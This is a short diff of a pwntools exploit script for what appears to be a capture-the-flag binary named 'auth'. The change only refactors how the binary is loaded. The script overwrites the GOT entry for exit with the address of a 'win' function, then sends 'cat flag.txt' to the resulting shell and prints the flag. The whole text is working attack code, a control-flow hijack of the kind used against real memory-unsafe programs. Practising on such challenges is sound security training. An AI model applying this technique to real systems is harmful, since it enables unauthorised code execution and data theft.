@@ -1,9 +1,9 @@
 from pwn import *
 
-e = ELF("./auth")
-p = e.process()
+context.binary = "./auth"
+p = process()
 
-p.sendline(hex(e.got["exit"]).encode("ascii"))
-p.sendline(hex(e.functions["win"].address).encode("ascii"))
+p.sendline(hex(context.binary.got["exit"]).encode("ascii"))
+p.sendline(hex(context.binary.functions["win"].address).encode("ascii"))
 p.sendline(b"cat flag.txt")
 log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
